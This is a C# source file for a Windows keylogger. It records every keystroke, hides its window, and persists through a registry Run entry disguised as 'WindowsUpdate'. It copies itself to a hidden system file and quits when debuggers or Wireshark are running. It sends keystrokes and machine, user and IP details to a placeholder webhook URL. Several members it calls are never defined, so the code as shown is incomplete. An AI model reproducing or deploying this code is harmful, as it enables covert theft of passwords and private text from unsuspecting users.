using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Microsoft.Win32;

class KeyLogger
{
    // Webhook configuration
    private static string webhookUrl = "YOUR_WEBHOOK_URL_HERE";

    // Logging buffer and state
    private static StringBuilder logBuffer = new StringBuilder();
    private static readonly object bufferLock = new object();
    private static bool isLogging = false;
    private static Timer logTimer;
    private static Timer cleanupTimer;

    // HTTP client for webhook
    private static HttpClient httpClient = new HttpClient();

    // Configuration
    private static int LogInterval = 5000; // 5 seconds default

    // Process hiding
    [DllImport("user32.dll")]
    private static extern bool ShowWindow(IntPtr hWnd, int nCmd);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetConsoleWindow();

    // Key state detection
    [DllImport("user32.dll")]
    private static extern short GetAsyncKeyState(int vKey);

    // Windows API constants
    private const int SW_HIDE = 0;
    private const int VK_SHIFT = 160;
    private const int VK_CONTROL = 162;
    private const int VK_ALT = 164;

    // Key mapping with enhanced support
    private static readonly Dictionary<int, string> KeyMapping = new Dictionary<int, string>
    {
        { 8, "[BACKSPACE]" },
        { 9, "[TAB]" },
        { 13, "[ENTER]" },
        { 27, "[ESC]" },
        { 32, " " },
        { 33, "[PAGE_UP]" },
        { 34, "[PAGE_DOWN]" },
        { 35, "[END]" },
        { 36, "[HOME]" },
        { 37, "[LEFT]" },
        { 38, "[UP]" },
        { 39, "[RIGHT]" },
        { 40, "[DOWN]" },
        { 45, "[INSERT]" },
        { 46, "[DELETE]" },
        { 144, "[NUM_LOCK]" },
        { 145, "[SCROLL_LOCK]" },
        { 160, "[SHIFT]" },
        { 161, "[SHIFT]" },
        { 162, "[CTRL]" },
        { 163, "[CTRL]" },
        { 164, "[ALT]" },
        { 165, "[ALT]" },
        { 186, ";" },
        { 187, "=" },
        { 188, "," },
        { 189, "-" },
        { 190, "." },
        { 191, "/" },
        { 219, "[" },
        { 220, "\\" },
        { 221, "]" },
        { 222, "'" }
    };

    // Enhanced key mapping for letters and numbers
    private static readonly Dictionary<int, string> AlphaNumericMapping = new Dictionary<int, string>
    {
        { 48, "0" }, { 49, "1" }, { 50, "2" }, { 51, "3" }, { 52, "4" },
        { 53, "5" }, { 54, "6" }, { 55, "7" }, { 56, "8" }, { 57, "9" },
        { 65, "a" }, { 66, "b" }, { 67, "c" }, { 68, "d" }, { 69, "e" },
        { 70, "f" }, { 71, "g" }, { 72, "h" }, { 73, "i" }, { 74, "j" },
        { 75, "k" }, { 76, "l" }, { 77, "m" }, { 78, "n" }, { 79, "o" },
        { 80, "p" }, { 81, "q" }, { 82, "r" }, { 83, "s" }, { 84, "t" },
        { 85, "u" }, { 86, "v" }, { 87, "w" }, { 88, "x" }, { 89, "y" },
        { 90, "z" }
    };

    static void Main(string[] args)
    {
        try
        {
            // Initialize keylogger
            InitializeKeyLogger();

            // Add to startup
            AddToStartup();

            // Hide console window
            HideConsole();

            // Start logging
            StartLogging();

            // Send initial PC information
            Task.Run(async () => await SendPCInfo());

            // Monitor for detection
            MonitorForDetection();
        
            CopyToSecureLocation();

            //SetupProcessHiding();

            // Keep the application running
            Console.WriteLine("KeyLogger started. Press Ctrl+C to stop.");
            Console.ReadLine();
        }
        catch (Exception ex)
        {
            LogToFile($"Critical error: {ex.Message}");
        }
    }

    private static void InitializeKeyLogger()
    {
        // Configure HTTP client
        httpClient.Timeout = TimeSpan.FromSeconds(30);

        // Load configuration if exists
        LoadConfiguration();

        // Start cleanup timer
        cleanupTimer = new Timer(CleanupMemory, null, 300000, 300000); // Every 5 minutes

        // Start logging timer
        logTimer = new Timer(SendBufferedLogs, null, LogInterval, LogInterval);
    }

    private static void HideConsole()
    {
        try
        {
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);
        }
        catch { /* Silent failure */ }
    }

    private static void AddToStartup()
    {
        try
        {
            string key = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
            using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(key, true))
            {
                string assemblyPath = Process.GetCurrentProcess().MainModule.FileName;
                string processName = Path.GetFileNameWithoutExtension(assemblyPath);

                // Use a less suspicious name
                registryKey.SetValue($"WindowsUpdate_{processName}", assemblyPath);
            }
        }
        catch { /* Silent failure */ }
    }

    private static void SetupProcessHiding()
    {
        try
        {
            IntPtr consoleWindow = GetConsoleWindow();
            if (consoleWindow != IntPtr.Zero)
            {
                ShowWindow(consoleWindow, SW_HIDE);
            }
            SetConsoleCtrlHandler(new HandlerRoutine(ConsoleCtrlHandler), true);
        }
        catch (Exception ex)
        {
            LogToFile($"Process hiding setup error: {ex.Message}");
        }
    }

    private static void CopyToSecureLocation()
    {
        try
        {
            string currentExecutable = Process.GetCurrentProcess().MainModule.FileName;

            if (string.Equals(currentExecutable, SecureExecutable, StringComparison.OrdinalIgnoreCase))
                return;

            if (!Directory.Exists(SecureFolder))
                Directory.CreateDirectory(SecureFolder);

            if (File.Exists(currentExecutable) && !File.Exists(SecureExecutable))
            {
                File.Copy(currentExecutable, SecureExecutable);
                LogToFile($"Copied to secure location: {SecureExecutable}");
                File.SetAttributes(SecureExecutable, FileAttributes.Hidden | FileAttributes.System);
            }
        }
        catch (Exception ex)
        {
            LogToFile($"Secure copy error: {ex.Message}");
        }
    }

    private static void StartLogging()
    {
        isLogging = true;
        var thread = new Thread(KeyboardHook);
        thread.IsBackground = true;
        thread.Start();
    }

    private static void KeyboardHook()
    {
        try
        {
            // Anti-debugging
            AntiDebugging();

            // Main hook loop
            while (isLogging)
            {
                for (int i = 0; i < 256; i++)
                {
                    if (GetAsyncKeyState(i) == -32767)
                    {
                        HandleKeyPress(i);
                    }
                }

                // Small delay to prevent high CPU usage
                Thread.Sleep(10);
            }
        }
        catch (Exception ex)
        {
            LogToFile($"Keyboard hook error: {ex.Message}");
        }
    }

    private static void HandleKeyPress(int vkCode)
    {
        try
        {
            if (!ShouldLogKey(vkCode))
                return;

            string keyName = GetKeyName(vkCode);

            // Add timestamp
            string timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");

            // Build log entry
            string logEntry = $"[{timestamp}] {keyName}";

            // Add to buffer
            lock (bufferLock)
            {
                logBuffer.AppendLine(logEntry);
            }
        }
        catch (Exception ex)
        {
            LogToFile($"Key press handling error: {ex.Message}");
        }
    }

    private static string GetKeyName(int vkCode)
    {
        // Check for special keys
        if (KeyMapping.ContainsKey(vkCode))
        {
            return KeyMapping[vkCode];
        }

        // Check for alphanumeric keys
        if (AlphaNumericMapping.ContainsKey(vkCode))
        {
            return AlphaNumericMapping[vkCode];
        }

        // Handle modifier keys specially
        if (vkCode >= 160 && vkCode <= 165)
        {
            return GetModifierKeyName(vkCode);
        }

        // Default to unknown key
        return $"[KEY_{vkCode}]";
    }

    private static string GetModifierKeyName(int vkCode)
    {
        switch (vkCode)
        {
            case 160:
            case 161:
                return "[SHIFT]";
            case 162:
            case 163:
                return "[CTRL]";
            case 164:
            case 165:
                return "[ALT]";
            default:
                return $"[MOD_{vkCode}]";
        }
    }

    private static bool ShouldLogKey(int vkCode)
    {
        // Skip certain keys that might be noise
        if (vkCode == 160 || vkCode == 161 || vkCode == 162 || vkCode == 163 || vkCode == 164 || vkCode == 165)
        {
            // These are modifier keys, we might want to log them differently
            // For now, we'll log them as they might be part of key combinations
            return true;
        }

        // Skip keys that are likely system keys
        if (vkCode >= 112 && vkCode <= 123) // F1-F12
        {
            return true; // Log function keys
        }

        return true;
    }

    private static void SendBufferedLogs()
    {
        if (logBuffer.Length == 0)
            return;

        lock (bufferLock)
        {
            if (logBuffer.Length == 0)
                return;

            string logs = logBuffer.ToString();
            logBuffer.Clear();

            // Send to webhook
            Task.Run(async () => await SendToWebhook(logs));
        }
    }

    private static async Task SendToWebhook(string logs)
    {
        try
        {
            if (string.IsNullOrEmpty(webhookUrl))
                return;

            // Create payload
            var payload = new
            {
                content = logs,
                username = "KeyLogger",
                avatar_url = "https://cdn.discordapp.com/emojis/873845238452384523.png"
            };

            // Send with retry logic
            await SendWithRetry(payload);
        }
        catch (Exception ex)
        {
            LogToFile($"Webhook send error: {ex.Message}");
        }
    }

    private static async Task SendWithRetry(object payload, int maxRetries = 3)
    {
        for (int i = 0; i < maxRetries; i++)
        {
            try
            {
                var json = System.Text.Json.JsonSerializer.Serialize(payload);
                var content = new StringContent(json, Encoding.UTF8, "application/json");
                var response = await httpClient.PostAsync(webhookUrl, content);

                if (response.IsSuccessStatusCode)
                    break;

                await Task.Delay(1000 * (i + 1)); // Exponential backoff
            }
            catch (Exception ex)
            {
                LogToFile($"Retry attempt {i + 1} failed: {ex.Message}");
                if (i == maxRetries - 1)
                    throw;

                await Task.Delay(1000 * (i + 1));
            }
        }
    }

    private static void CleanupMemory(object state)
    {
        try
        {
            // Clear buffer if it's too large
            lock (bufferLock)
            {
                if (logBuffer.Length > 100000) // 100KB limit
                {
                    logBuffer.Clear();
                }
            }
        }
        catch (Exception ex)
        {
            LogToFile($"Cleanup error: {ex.Message}");
        }
    }

    private static void SendBufferedLogs(object state)
    {
        try
        {
            SendBufferedLogs();
        }
        catch (Exception ex)
        {
            LogToFile($"Buffered logs error: {ex.Message}");
        }
    }

    private static async Task SendPCInfo()
    {
        try
        {
            var info = new StringBuilder();
            info.AppendLine("=== PC Information ===");
            info.AppendLine($"Computer Name: {Environment.MachineName}");
            info.AppendLine($"User: {Environment.UserName}");
            info.AppendLine($"OS: {Environment.OSVersion}");
            info.AppendLine($"Architecture: {(Environment.Is64BitOperatingSystem ? "x64" : "x86")}");
            info.AppendLine($"Process: {Process.GetCurrentProcess().ProcessName}");
            info.AppendLine($"Start Time: {DateTime.Now}");

            // Get IP address
            try
            {
                var host = System.Net.Dns.GetHostEntry(System.Net.Dns.GetHostName());
                foreach (var ip in host.AddressList)
                {
                    if (ip.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                    {
                        info.AppendLine($"IP Address: {ip.ToString()}");
                        break; // Get the first IPv4 address
                    }
                }
            }
            catch (Exception ex)
            {
                info.AppendLine($"IP Address: Unable to retrieve IP address - {ex.Message}");
            }

            info.AppendLine("======================");

            // Add a small delay to ensure the webhook URL is loaded
            await Task.Delay(100);

            await SendToWebhook(info.ToString());
        }
        catch (Exception ex)
        {
            LogToFile($"PC info error: {ex.Message}");
            // Also log the stack trace for better debugging
            LogToFile($"PC info stack trace: {ex.StackTrace}");
        }
    }

    private static void LoadConfiguration()
    {
        try
        {
            // Load configuration from file if it exists
            string configPath = "keylogger_config.txt";
            if (File.Exists(configPath))
            {
                var lines = File.ReadAllLines(configPath);
                foreach (var line in lines)
                {
                    if (line.StartsWith("webhook_url="))
                    {
                        webhookUrl = line.Substring(12);
                    }
                    else if (line.StartsWith("log_interval="))
                    {
                        if (int.TryParse(line.Substring(13), out int interval))
                        {
                            LogInterval = Math.Max(1000, Math.Min(60000, interval)); // 1s to 60s
                        }
                    }
                }
            }
        }
        catch (Exception ex)
        {
            LogToFile($"Configuration load error: {ex.Message}");
        }
    }

    private static void AntiDebugging()
    {
        try
        {
            // Check if process is being debugged
            if (Debugger.IsAttached)
                Environment.Exit(0);

            // Check for common debugging tools
            var tools = new[] { "OllyDbg", "x32dbg", "x64dbg", "ProcessHacker", "Wireshark" };
            foreach (var tool in tools)
            {
                if (Process.GetProcessesByName(tool).Length > 0)
                    Environment.Exit(0);
            }
        }
        catch (Exception ex)
        {
            LogToFile($"Anti-debugging error: {ex.Message}");
        }
    }

    private static void MonitorForDetection()
    {
        try
        {
            // This method can be extended to monitor for various detection methods
            // For example, checking for file changes, process termination, etc.

            // Start a monitoring thread
            var monitorThread = new Thread(() =>
            {
                while (true)
                {
                    try
                    {
                        // Check for keylogger file removal
                        // Monitor system resources
                        // Adjust behavior based on system load

                        Thread.Sleep(30000); // Check every 30 seconds
                    }
                    catch (Exception ex)
                    {
                        LogToFile($"Monitoring error: {ex.Message}");
                        Thread.Sleep(5000);
                    }
                }
            });
            monitorThread.IsBackground = true;
            monitorThread.Start();
        }
        catch (Exception ex)
        {
            LogToFile($"Monitoring setup error: {ex.Message}");
        }
    }

    private static void LogToFile(string message)
    {
        try
        {
            string logPath = "keylogger.log";
            string timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
            string logEntry = $"[{timestamp}] {message}{Environment.NewLine}";

            File.AppendAllText(logPath, logEntry);
        }
        catch { /* Silent failure */ }
    }
}